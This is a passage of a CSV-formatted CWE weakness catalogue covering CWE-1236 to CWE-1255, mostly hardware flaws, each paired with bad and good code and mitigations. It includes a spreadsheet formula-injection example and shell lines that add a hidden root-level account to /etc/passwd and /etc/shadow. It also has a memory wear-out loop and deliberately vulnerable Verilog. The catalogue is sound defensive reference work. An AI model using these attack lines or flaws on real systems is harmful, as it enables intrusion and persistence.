CWE-1236: Improper Neutralization of Formula Elements in a CSV File,"The product saves user-provided information into a Comma-Separated Value (CSV) file, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as a command when the file is opened by a spreadsheet product.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or CommandsCurrent versions of Excel warn users of untrusted content., Likelihood: Low","Example 1Hyperlinks or other commands can be executed when a cell begins with the formula identifier, '='(attack code)Example Language:Other=HYPERLINK(link_location, [friendly_name])Stripping the leading equals sign, or simply not executing formulas from untrusted sources, impedes malicious activity.(good code)HYPERLINK(link_location, [friendly_name])","Phase:  ImplementationWhen generating CSV output, ensure that formula-sensitive metacharacters are effectively escaped or removed from all data before storage in the resultant CSV. Risky characters include '=' (equal), '+' (plus), '-' (minus), and '@' (at).Effectiveness: ModerateNote:Unfortunately, there is no perfect solution, since different spreadsheet products act differently.Phase:  ImplementationIf a field starts with a formula character, prepend it with a ' (single apostrophe), which prevents Excel from executing the formula.Effectiveness: ModerateNote:It is not clear how effective this mitigation is with other spreadsheet software.Phase:  Architecture and DesignCertain implementations of spreadsheet software might disallow formulas from executing if the file is untrusted, or if the file is not authored by the current user.Effectiveness: LimitedNote:This mitigation has limited effectiveness because it often depends on end users opening spreadsheet software safely."
CWE CATEGORY: SFP Primary Cluster: Faulty Resource Release,This category identifies Software Fault Patterns (SFPs) within the Faulty Resource Release cluster (SFP37).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Primary Cluster: Failure to Release Memory,This category identifies Software Fault Patterns (SFPs) within the Failure to Release Memory cluster (SFP38).,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1239: Improper Zeroization of Hardware Register,The hardware product does not properly clear sensitive information from built-in registers when the user of the hardware block changes.,"Scope: Confidentiality, Impact: Technical Impact:Varies by ContextThe consequences will depend on the information disclosed due to the vulnerability., Likelihood: ","Example 1Suppose a hardware IP for implementing an encryption routine works as expected, but it leaves the intermediate results in some registers that can be accessed. Exactly why this access happens is immaterial - it might be unintentional or intentional, where the designer wanted a ""quick fix"" for something.Example 2The example code below [REF-1379] is taken from the SHA256 Interface/wrapper controller module of the HACK@DAC'21 buggy OpenPiton SoC. Within the wrapper module there are a set of 16 memory-mapped registers referenced data[0] to data[15]. These registers are 32 bits in size and are used to store the data received on the AXI Lite interface for hashing. Once both the message to be hashed and a request to start the hash computation are received, the values of these registers will be forwarded to the underlying SHA256 module for processing. Once forwarded, the values in these registers no longer need to be retained. In fact, if not cleared or overwritten, these sensitive values can be read over the AXI Lite interface, potentially compromising any previously confidential data stored therein.(bad code)Example Language:Verilog...// Implement SHA256 I/O memory map interface// Write sidealways @(posedge clk_i)beginif(~(rst_ni && ~rst_3))beginstartHash <= 0;newMessage <= 0;data[0] <= 0;data[1] <= 0;data[2] <= 0;...data[14] <= 0;data[15] <= 0;...In the previous code snippet [REF-1379] there is the lack of a data clearance mechanism for the memory-mapped I/O registers after their utilization. These registers get cleared only when a reset condition is met. This condition is met when either the global negative-edge reset input signal (rst_ni) or the dedicated reset input signal for SHA256 peripheral (rst_3) is active. In other words, if either of these reset signals is true, the registers will be cleared. However, in cases where there is not a reset condition these registers retain their values until the next hash operation. It is during the time between an old hash operation and a new hash operation that that data is open to unauthorized disclosure.To correct the issue of data persisting between hash operations, the memory mapped I/O registers need to be cleared once the values written in these registers are propagated to the SHA256 module. This could be done for example by adding a new condition to zeroize the memory mapped I/O registers once the hash value is computed, i.e., hashValid signal asserted, as shown in the good code example below [REF-1380]. This fix will clear the memory-mapped I/O registers after the data has been provided as input to the SHA engine.(good code)Example Language:Verilog...// Implement SHA256 I/O memory map interface// Write sidealways @(posedge clk_i)beginif(~(rst_ni && ~rst_3))beginstartHash <= 0;newMessage <= 0;data[0] <= 0;data[1] <= 0;data[2] <= 0;...data[14] <= 0;data[15] <= 0;endelse if(hashValid && ~hashValid_r)begindata[0] <= 0;data[1] <= 0;data[2] <= 0;...data[14] <= 0;data[15] <= 0;end...","Phase:  Architecture and DesignEvery register potentially containing sensitive information must have a policy specifying how and when information is cleared, in addition to clarifying if it is the responsibility of the hardware logic or IP user to initiate the zeroization procedure at the appropriate time.Note:Unfortunately, data disclosure can occur even after information has been overwritten/zeroized from the digital perspective. Physical characteristics of the memory can reveal the history of previously written data. For example, if the same value is written repeatedly to a memory location, the corresponding memory cells can become physically altered to a degree that even if the original data is erased it can still be recovered through physical characterization of the memory cells [REF-1055]."
CWE-1240: Use of a Cryptographic Primitive with a Risky Implementation,"To fulfill the need for a cryptographic primitive, the product implements a cryptographic algorithm using a non-standard, unproven, or disallowed/non-compliant cryptographic implementation.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIncorrect usage of crypto primitives could render the supposedly encrypted data as unencrypted plaintext in the worst case., Likelihood: High","Example 1Re-using random values may compromise security.(bad code)Suppose an Encryption algorithm needs a random value for a key. Instead of using a DRNG (Deterministic Random Number Generator), the designer uses a linear-feedback shift register (LFSR) to generate the value.While an LFSR may provide pseudo-random number generation service, the entropy (measure of randomness) of the resulting output may be less than that of an accepted DRNG (like that used in dev/urandom). Thus, using an LFSR weakens the strength of the cryptographic system, because it may be possible for an attacker to guess the LFSR output and subsequently the encryption key.(good code)If a cryptographic algorithm expects a random number as its input, provide one. Do not provide a pseudo-random value.","Phase:  RequirementsRequire compliance with the strongest-available recommendations from trusted parties, and require that compliance must be kept up-to-date, since recommendations evolve over time. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].Effectiveness: HighPhase:  Architecture and DesignEnsure that the architecture/design uses the strongest-available primitives and algorithms from trusted parties. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].Effectiveness: HighPhase:  Architecture and DesignDo not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. As with all cryptographic mechanisms, the source code should be available for analysis. If the algorithm may be compromised when attackers find out how it works, then it is especially weak.Effectiveness: Discouraged Common PracticePhase:  Architecture and DesignTry not to use cryptographic algorithms in novel ways or with new modes of operation even when you ""know"" it is secure. For example, using SHA-2 chaining to create a 1-time pad for encryption might sound like a good idea, but one should not do this.Effectiveness: Discouraged Common PracticePhase:  Architecture and DesignEnsure that the design can replace one cryptographic primitive or algorithm with another in the next generation (""cryptographic agility""). Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. This is especially important for hardware, which can be more difficult to upgrade quickly than software; design the hardware at a replaceable block level.Effectiveness: Defense in DepthPhase:  Architecture and DesignDo not use outdated or non-compliant cryptography algorithms. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong [REF-267].Effectiveness: Discouraged Common PracticePhases:  Architecture and Design; ImplementationDo not use a linear-feedback shift register (LFSR) or other legacy methods as a substitute for an accepted and standard Random Number Generator.Effectiveness: Discouraged Common PracticePhases:  Architecture and Design; ImplementationDo not use a checksum as a substitute for a cryptographically generated hash.Effectiveness: Discouraged Common PracticePhase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted cryptographic library or framework. Industry-standard implementations will save development time and are more likely to avoid errors that can occur during implementation of cryptographic algorithms. However, the library/framework could be used incorrectly during implementation.Effectiveness: HighPhases:  Architecture and Design; ImplementationWhen using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for the prevention of common attacks.Effectiveness: ModeratePhases:  Architecture and Design; ImplementationDo not store keys in areas accessible to untrusted agents. Carefully manage and protect the cryptographic keys (seeCWE-320). If the keys can be guessed or stolen, then the strength of the cryptography algorithm is irrelevant.Effectiveness: Moderate"
CWE-1241: Use of Predictable Algorithm in Random Number Generator,The device uses an algorithm that is predictable and generates a pseudo-random number.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: High","Example 1Suppose a cryptographic function expects random value to be supplied for the crypto algorithm.During the implementation phase, due to space constraint, a cryptographically secure random-number-generator could not be used, and instead  of using a TRNG (True Random Number Generator), a LFSR (Linear Feedback Shift Register) is used to generate a random value. While an LFSR will provide a pseudo-random number, its entropy (measure of randomness) is insufficient for a cryptographic algorithm.Example 2The example code is taken from the PRNG inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1370]. The SoC implements a pseudo-random number generator using a Linear Feedback Shift Register (LFSR).An example of LFSR with the polynomial function P(x) = x6+x4+x3+1 is shown in the figure.(bad code)Example Language:Verilogreg in_sr, entropy16_valid;reg [15:0] entropy16;assign entropy16_o = entropy16;assign entropy16_valid_o = entropy16_valid;always @ (*)beginin_sr = ^ (poly_i [15:0] & entropy16 [15:0]);endA LFSR's input bit is determined by the output of a linear function of two or more of its previous states. Therefore, given a long cycle, a LFSR-based PRNG will enter a repeating cycle, which is predictable.",Phase:  Architecture and DesignA true random number generator should be specified for cryptographic algorithms.Phase:  ImplementationA true random number generator should be implemented for cryptographic algorithms.
CWE-1242: Inclusion of Undocumented Features or Chicken Bits,The device includes chicken bits or undocumented features that can create entry points for unauthorized actors.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Read Memory; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ","Example 1Consider a device that comes with various security measures, such as secure boot. The secure-boot process performs firmware-integrity verification at boot time, and this code is stored in a separate SPI-flash device. However, this code contains undocumented ""special access features"" intended to be used only for performing failure analysis and intended to only be unlocked by the device designer.(bad code)Example Language:OtherAttackers dump the code from the device and then perform reverse engineering to analyze the code. The undocumented, special-access features are identified, and attackers can activate them by sending specific commands via UART before secure-boot phase completes. Using these hidden features, attackers can perform reads and writes to memory via the UART interface. At runtime, the attackers can also execute arbitrary code and dump the entire memory contents.Remove all chicken bits and hidden features that are exposed to attackers. Add authorization schemes that rely on cryptographic primitives to access any features that the manufacturer does not want to expose. Clearly document all interfaces.","Phases:  Architecture and Design; ImplementationThe implementation of chicken bits in a released product is highly discouraged. If implemented at all, ensure that they are disabled in production devices. All interfaces to a device should be documented.Effectiveness: High"
CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug,Access to security-sensitive information stored in fuses is not limited during debug.,"Scope: ConfidentialityAccess Control, Impact: Technical Impact:Modify Memory; Bypass Protection Mechanism, Likelihood: ","Example 1Sensitive manufacturing data (such as die information) are stored in fuses. When the chip powers on, these values are read from the fuses and stored in microarchitectural registers. These registers are only given read access to trusted software running on the core. Untrusted software running on the core is not allowed to access these registers.(bad code)Example Language:OtherAll microarchitectural registers in this chip can be accessed through the debug interface. As a result, even an untrusted debugger can access this data and retrieve sensitive manufacturing data.(good code)Registers used to store sensitive values read from fuses should be blocked during debug. These registers should be disconnected from the debug interface.Example 2The example code below is taken from one of the AES cryptographic accelerators of the HACK@DAC'21 buggy OpenPiton SoC [REF-1366]. The operating system (OS) uses three AES keys to encrypt and decrypt sensitive data using this accelerator. These keys are sensitive data stored in fuses. The security of the OS will be compromised if any of these AES keys are leaked. During system bootup, these AES keys are sensed from fuses and stored in temporary hardware registers of the AES peripheral. Access to these temporary registers is disconnected during the debug state to prevent them from leaking through debug access. In this example (see the vulnerable code source), the registers key0, key1, and key2 are used to store the three AES keys (which are accessed through key_big0, key_big1, and key_big2 signals). The OS selects one of these three keys through the key_big signal, which is used by the AES engine.(bad code)Example Language:Verilog...assign key_big0    = debug_mode_i ? 192'b0 : {key0[0],key0[1], key0[2], key0[3], key0[4], key0[5]};assign key_big1    = debug_mode_i ? 192'b0 : {key1[0],key1[1], key1[2], key1[3], key1[4], key1[5]};assign key_big2    = {key2[0], key2[1], key2[2],key2[3], key2[4], key2[5]};...assign key_big = key_sel[1] ? key_big2 : ( key_sel[0] ?key_big1 : key_big0 );...The above code illustrates an instance of a vulnerable implementation for blocking AES key mechanism when the system is in debug mode (i.e., when debug_mode_i is asserted). During debug mode, key accesses through key_big0 and key_big1 are effectively disconnected, as their values are set to zero. However, the key accessed via the key_big2 signal remains accessible, creating a potential pathway for sensitive fuse data leakage, specifically AES key2, during debug mode. Furthermore, even though it is not strictly necessary to disconnect the key_big signal when entering debug mode (since disconnecting key_big0, key_big1, and key_big2 will inherently disconnect key_big), it is advisable, in line with the defense-in-depth strategy, to also sever the connection to key_big. This additional security measure adds an extra layer of protection and safeguards the AES keys against potential future modifications to the key_big logic.To mitigate this, disconnect access through key_big2 and key_big during debug mode [REF-1367].(good code)Example Language:Verilog...assign key_big0    = debug_mode_i ? 192'b0 : {key0[0],key0[1], key0[2], key0[3], key0[4], key0[5]};assign key_big1    = debug_mode_i ? 192'b0 : {key1[0],key1[1], key1[2], key1[3], key1[4], key1[5]};assign key_big2    =debug_mode_i ? 192'b0 :{key2[0],key2[1], key2[2], key2[3], key2[4], key2[5]};...assign key_big =debug_mode_i ? 192'b0 :(  key_sel[1] ?key_big2 : ( key_sel[0] ? key_big1 : key_big0 )  );...",Phases:  Architecture and Design; ImplementationDisable access to security-sensitive information stored in fuses directly and also reflected from temporary storage locations when in debug mode.
CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State,"The product uses physical debug or test interfaces with support for multiple access levels, but it assigns the wrong debug access level to an internal asset, providing unintended access to the asset from untrusted debug agents.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Memory, Likelihood: ; Scope: AuthorizationAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ","Example 1The JTAG interface is used to perform debugging and provide CPU core access for developers. JTAG-access protection is implemented as part of the JTAG_SHIELD bit in the hw_digctl_ctrl register. This register has no default value at power up and is set only after the system boots from ROM and control is transferred to the user software.(bad code)Example Language:Other1 bit0x0 = JTAG debugger is enabled (default)JTAG_SHIELD0x1 = JTAG debugger is disabledThis means that since the end user has access to JTAG at system reset and during ROM code execution before control is transferred to user software, a JTAG user can modify the boot flow and subsequently disclose all CPU information, including data-encryption keys.(informative)The default value of this register bit should be set to 1 to prevent the JTAG from being enabled at system reset.Example 2The example code below is taken from the CVA6 processor core of the HACK@DAC'21 buggy OpenPiton SoC. Debug access allows users to access internal hardware registers that are otherwise not exposed for user access or restricted access through access control protocols. Hence, requests to enter debug mode are checked and authorized only if the processor has sufficient privileges. In addition, debug accesses are also locked behind password checkers. Thus, the processor enters debug mode only when the privilege level requirement is met, and the correct debug password is provided.The following code [REF-1377] illustrates an instance of a vulnerable implementation of debug mode. The core correctly checks if the debug requests have sufficient privileges and enables the debug_mode_d and debug_mode_q signals. It also correctly checks for debug password and enables umode_i signal.(bad code)Example Language:Verilogmodule csr_regfile #(...// check that we actually want to enter debug depending on the privilege level we are currently inunique case (priv_lvl_o)riscv::PRIV_LVL_M: begindebug_mode_d = dcsr_q.ebreakm;...riscv::PRIV_LVL_U: begindebug_mode_d = dcsr_q.ebreaku;...assign priv_lvl_o = (debug_mode_q || umode_i) ?  riscv::PRIV_LVL_M : priv_lvl_q;...debug_mode_q  <= debug_mode_d;...However, it grants debug access and changes the privilege level, priv_lvl_o, even when one of the two checks is satisfied and the other is not. Because of this, debug access can be granted by simply requesting with sufficient privileges (i.e., debug_mode_q is enabled) and failing the password check (i.e., umode_i is disabled). This allows an attacker to bypass the debug password checking and gain debug access to the core, compromising the security of the processor.A fix to this issue is to only change the privilege level of the processor when both checks are satisfied, i.e., the request has enough privileges (i.e., debug_mode_q is enabled) and the password checking is successful (i.e., umode_i is enabled) [REF-1378].(good code)Example Language:Verilogmodule csr_regfile #(...// check that we actually want to enter debug depending on the privilege level we are currently inunique case (priv_lvl_o)riscv::PRIV_LVL_M: begindebug_mode_d = dcsr_q.ebreakm;...riscv::PRIV_LVL_U: begindebug_mode_d = dcsr_q.ebreaku;...assign priv_lvl_o =(debug_mode_q && umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;...debug_mode_q  <= debug_mode_d;...","Phases:  Architecture and Design; ImplementationFor security-sensitive assets accessible over debug/test interfaces, only allow trusted agents.Effectiveness: HighPhase:  Architecture and DesignApply blinding [REF-1219] or masking techniques in strategic areas.Effectiveness: LimitedPhase:  ImplementationAdd shielding or tamper-resistant protections to the device, which increases the difficulty and cost for accessing debug/test interfaces.Effectiveness: Limited"
CWE-1245: Improper Finite State Machines (FSMs) in Hardware Logic,"Faulty finite state machines (FSMs) in the hardware logic allow an attacker to put the system in an undefined state, to cause a denial of service (DoS) or gain privileges on the victim's system.","Scope: AvailabilityAccess Control, Impact: Technical Impact:Unexpected State; DoS: Crash, Exit, or Restart; DoS: Instability; Gain Privileges or Assume Identity, Likelihood: ","Example 1The Finite State Machine (FSM) shown in the ""bad"" code snippet below assigns the output (""out"") based on the value of state, which is determined based on the user provided input (""user_input"").(bad code)Example Language:Verilogmodule fsm_1(out, user_input, clk, rst_n);input [2:0] user_input;input clk, rst_n;output reg [2:0] out;reg [1:0] state;always @ (posedge clk or negedge rst_n )beginif (!rst_n)state = 3'h0;elsecase (user_input)3'h0:3'h1:3'h2:3'h3: state = 2'h3;3'h4: state = 2'h2;3'h5: state = 2'h1;endcaseendout <= {1'h1, state};endmoduleThe case statement does not include a default to handle the scenario when the user provides inputs of 3'h6 and 3'h7.  Those inputs push the system to an undefined state and might cause a crash (denial of service) or any other unanticipated outcome.Adding a default statement to handle undefined inputs mitigates this issue.  This is shown in the ""Good"" code snippet below.  The default statement is in bold.(good code)Example Language:Verilogcase (user_input)3'h0:3'h1:3'h2:3'h3: state = 2'h3;3'h4: state = 2'h2;3'h5: state = 2'h1;default: state = 2'h0;endcase",Phases:  Architecture and Design; ImplementationDefine all possible states and handle all unused states through default statements. Ensure that system defaults to a secure state.Effectiveness: High
CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories,The product does not implement or incorrectly implements wear leveling operations in limited-write non-volatile memories.,"Scope: Availability, Impact: Technical Impact:DoS: Instability, Likelihood: ","Example 1An attacker can render a memory line unusable by repeatedly causing a write to the memory line.Below is example code from [REF-1058] that the user can execute repeatedly to cause line failure. W is the maximum associativity of any cache in the system; S is the size of the largest cache in the system.(attack code)Example Language:C++// Do aligned alloc of (W+1) arrays each of size Swhile(1) {for (ii = 0; ii < W + 1; ii++)array[ii].element[0]++;}Without wear leveling, the above attack will be successful. Simple randomization of blocks will not suffice as instead of the original physical block, the randomized physical block will be worn out.(good code)Wear leveling must be used to even out writes to the device.",Phases:  Architecture and Design; Implementation; TestingInclude secure wear leveling algorithms and ensure they may not be bypassed.Effectiveness: High
CWE-1247: Improper Protection Against Voltage and Clock Glitches,The device does not contain or contains incorrectly implemented circuitry or sensors to detect and mitigate voltage and clock glitches and protect sensitive information or software contained on the device.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism; Read Memory; Modify Memory; Execute Unauthorized Code or Commands, Likelihood: ","Example 1Below is a representative snippet of C code that is part of the secure-boot flow. A signature of the runtime-firmware image is calculated and compared against a golden value. If the signatures match, the bootloader loads runtime firmware. If there is no match, an error halt occurs. If the underlying hardware executing this code does not contain any circuitry or sensors to detect voltage or clock glitches, an attacker might launch a fault-injection attack right when the signature check is happening (at the location marked with the comment), causing a bypass of the signature-checking process.(bad code)Example Language:C...if (signature_matches)  // <-Glitch Here{load_runtime_firmware();}else{do_not_load_runtime_firmware();}...After bypassing secure boot, an attacker can gain access to system assets to which the attacker should not have access.(good code)If the underlying hardware detects a voltage or clock glitch, the information can be used to prevent the glitch from being successful.","Phases:  Architecture and Design; ImplementationAt the circuit-level, using Tunable Replica Circuits (TRCs) or special flip-flops such as Razor flip-flops helps mitigate glitch attacks. Working at the SoC or platform base, level sensors may be implemented to detect glitches. Implementing redundancy in security-sensitive code (e.g., where checks are performed)also can help with mitigation of glitch attacks."
CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications,The security-sensitive hardware module contains semiconductor defects.,"Scope: AvailabilityAccess Control, Impact: Technical Impact:DoS: Instability, Likelihood: ","Example 1The network-on-chip implements a firewall for access control to peripherals from all IP cores capable of mastering transactions.(bad code)Example Language:OtherA manufacturing defect in this logic manifests itself as a logical fault, which always sets the output of the filter to ""allow"" access.Post-manufacture testing must be performed to ensure that hardware logic implementing security functionalities is defect-free.","Phase:  TestingWhile semiconductor-manufacturing companies implement several mechanisms to continuously improve the semiconductor manufacturing process to ensure reduction of defects, some defects can only be fixed after manufacturing. Post-manufacturing testing of silicon die is critical. Fault models such as stuck-at-0 or stuck-at-1 must be used to develop post-manufacturing test cases and achieve good coverage. Once the silicon packaging is done, extensive post-silicon testing must be performed to ensure that hardware logic implementing security functionalities is defect-free.Phase:  OperationOperating the hardware outside device specification, such as at extremely high temperatures, voltage, etc., accelerates semiconductor degradation and results in defects. When these defects manifest as faults in security-critical, hardware modules, it results in compromise of security guarantees. Thus, operating the device within the specification is important."
CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System,"The product provides an application for administrators to manage parts of the underlying operating system, but the application does not accurately identify all of the relevant entities or resources that exist in the OS; that is, the application's model of the OS's state is inconsistent with the OS's actual state.","Scope: Access Control, Impact: Technical Impact:Varies by Context, Likelihood: ; Scope: Accountability, Impact: Technical Impact:Hide Activities, Likelihood: ; Scope: Other, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1Suppose that an attacker successfully gains root privileges on a Linux system and adds a new 'user2' account:(attack code)Example Language:Otherecho ""user2:x:0:0::/root:/"" >> /etc/passwd;echo
					  ""user2:\$6\$IdvyrM6VJnG8Su5U\$1gmW3Nm.IO4vxTQDQ1C8urm72JCadOHZQwqiH/nRtL8dPY80xS4Ovsv5bPCMWnXKKWwmsocSWXupUf17LB3oS.:17256:0:99999:7:::"" >> /etc/shadow;This new user2 account would not be noticed on the web interface, if the interface does not refresh its data of available users.It could be argued that for this specific example, an attacker with root privileges would be likely to compromise the admin tool or otherwise feed it with false data.  However, this example shows how the discrepancy in critical data can help attackers to escape detection.","Phase:  Architecture and DesignEnsure that the admin tool refreshes its model of the underlying OS on a regular basis, and note any inconsistencies with configuration files or other data sources that are expected to have the same data."
CWE-1250: Improper Preservation of Consistency Between Independent Representations of Shared State,The product has or supports multiple distributed components or sub-systems that are each required to keep their own local copy of shared data - such as state or cache - but the product does not ensure that all local copies remain consistent with each other.,无常见后果信息,"Example 1Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of ""accessible"" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.Suppose the interconnect fabric does not prioritize such ""update"" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario.",无可能的缓解方案
CWE-1251: Mirrored Regions with Different Values,The product's architecture mirrors regions without ensuring that their contents always stay in sync.,"Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of ""accessible"" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.Suppose the interconnect fabric does not prioritize such ""update"" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario.","Phase:  Architecture and DesignWhenever there are multiple, physically different copies of the same value that might change and the process to update them is not instantaneous and atomic, it is impossible to assert that the original and shadow copies will always be in sync - there will always be a time period when they are out of sync. To mitigate the consequential risk, the recommendations essentially are:Make this out-of-sync time period as small as possible, andMake the update process as robust as possible.Effectiveness: Moderate"
CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations,The CPU is not configured to provide hardware support for exclusivity of write and execute operations on memory. This allows an attacker to execute data from all of memory.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1MCS51 Microcontroller (based on 8051) does not have a special bit to support write exclusivity. It also does not have an MMU/MPU support. The Cortex-M CPU has an optional MPU that supports up to 8 regions.(bad code)Example Language:OtherThe optional MPU is not configured.If the MPU is not configured, then an attacker will be able to inject malicious data into memory and execute it.","Phase:  Architecture and DesignImplement a dedicated bit that can be leveraged by the Operating System to mark data areas as non-executable. If such a bit is not available in the CPU, implement MMU/MPU (memory management unit / memory protection unit).Phase:  IntegrationIf MMU/MPU are not available, then the firewalls need to be implemented in the SoC interconnect to mimic the write-exclusivity operation."
CWE-1253: Incorrect Selection of Fuse Values,The logic level used to set a system to a secure state relies on a fuse being unblown. An attacker can set the system to an insecure state merely by blowing the fuse.,"Scope: Access ControlAuthorization, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity, Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart, Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands, Likelihood: ","Example 1A chip implements a secure boot and uses the sensed value of a fuse 
         ""do_secure_boot"" to determine whether to perform a secure boot or not. If this fuse 
         value is ""0"", the system performs secure boot. Otherwise, it does not perform secure 
         boot.An attacker blows the ""do_secure_boot"" fuse to ""1"". After reset, the attacker loads a custom 
         bootloader, and, since the fuse value is now ""1"", the system does not perform secure boot, 
         and the attacker can execute their custom firmware image.Since by default, a fuse-configuration value is a ""0"", an attacker can blow it to a ""1"" with 
         inexpensive hardware.If the logic is reversed, an attacker cannot easily reset the fuse. Note that, with 
         specialized and expensive equipment, an attacker with full physical access might be able to ""unblow"" the fuse 
         value to a ""0"".",Phase:  Architecture and DesignLogic should be designed in a way that blown fuses do not put the product into an insecure state that can be leveraged by an attacker.
CWE-1254: Incorrect Comparison Logic Granularity,"The product's comparison logic is performed over a series of steps rather than across the entire string in one operation. If there is a comparison logic failure on one of these steps, the operation may be vulnerable to a timing attack that can result in the interception of the process for nefarious purposes.","Scope: ConfidentialityAuthorization, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1Consider an example hardware module that checks a user-provided password to grant access to a user. The user-provided password is compared against a golden value in a byte-by-byte manner.(bad code)Example Language:Verilogalways_comb @ (posedge clk)beginassign check_pass[3:0] = 4'b0;for (i = 0; i < 4; i++) beginif (entered_pass[(i*8 - 1) : i] eq golden_pass([i*8 - 1) : i])assign check_pass[i] = 1;continue;elseassign check_pass[i] = 0;break;endassign grant_access = (check_pass == 4'b1111) ? 1'b1: 1'b0;endSince the code breaks on an incorrect entry of password, an attacker can guess the correct password for that byte-check iteration with few repeat attempts.To fix this weakness, either the comparison of the entire string should be done all at once, or the attacker is not given an indication whether pass or fail happened by allowing the comparison to run through all bits before the grant_access signal is set.(good code)always_comb @ (posedge clk)beginassign check_pass[3:0] = 4'b0;for (i = 0; i < 4; i++) beginif (entered_pass[(i*8 - 1) : i] eq golden_pass([i*8 -1) : i])assign check_pass[i] = 1;continue;elseassign check_pass[i] = 0;continue;endassign grant_access = (check_pass == 4'b1111) ? 1'b1: 1'b0;end",Phase:  ImplementationThe hardware designer should ensure that comparison logic is implemented so as to compare in one operation instead in smaller chunks.
CWE-1255: Comparison Logic is Vulnerable to Power Side-Channel Attacks,A device's real time power consumption may be monitored during security token evaluation and the information gleaned may be used to determine the value of the reference token.,"Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Modify Memory; Read Memory; Read Files or Directories; Modify Files or Directories; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Read Application Data; Modify Application Data; Hide ActivitiesAs compromising a security token may result in complete system control, the impacts are relatively universal, Likelihood: ","Example 1Consider an example hardware module that checks a user-provided password (or PIN) to grant access to a user. The user-provided password is compared against a stored value byte-by-byte.(bad code)Example Language:Cstatic nonvolatile password_tries = NUM_RETRIES;dowhile (password_tries == 0) ; // Hang here if no more password triespassword_ok = 0;for (i = 0; i < NUM_PW_DIGITS; i++)if (GetPasswordByte() == stored_password([i])password_ok |= 1; // Power consumption is different hereelsepassword_ok |= 0; // than from hereendif (password_ok > 0)password_tries = NUM_RETRIES;break_to_Ok_to_proceedpassword_tries--;while (true)// Password OKSince the algorithm uses a different number of 1's and 0's for password validation, a different amount of power is consumed for the good byte versus the bad byte comparison. Using this information, an attacker may be able to guess the correct password for that byte-by-byte iteration with several repeated attempts by stopping the password evaluation before it completes.Among various options for mitigating the string comparison is obscuring the power consumption by having opposing bit flips during bit operations. Note that in this example, the initial change of the bit values could still provide power indication depending upon the hardware itself. This possibility needs to be measured for verification.(good code)Example Language:Cstatic nonvolatile password_tries = NUM_RETRIES;dowhile (password_tries == 0) ; // Hang here if no more password triespassword_tries--;  // Put retry code here to catch partial retriespassword_ok = 0;for (i = 0; i < NUM_PW_DIGITS; i++)if (GetPasswordByte() == stored_password([i])password_ok |= 0x10; // Power consumption hereelsepassword_ok |= 0x01; // is now the same hereendif ((password_ok & 1) == 0)password_tries = NUM_RETRIES;break_to_Ok_to_proceedwhile (true)// Password OKExample 2This code demonstrates the transfer of a secret key using Serial-In/Serial-Out shift. It's easy to extract the secret using simple power analysis as each shift gives data on a single bit of the key.(bad code)Example Language:Verilogmodule siso(clk,rst,a,q);input a;input clk,rst;output q;reg q;always@(posedge clk,posedge rst)beginif(rst==1'b1)q<1'b0;elseq<a;endendmoduleThis code demonstrates the transfer of a secret key using a Parallel-In/Parallel-Out shift. In a parallel shift, data confounded by multiple bits of the key, not just one.(good code)Example Language:Verilogmodule 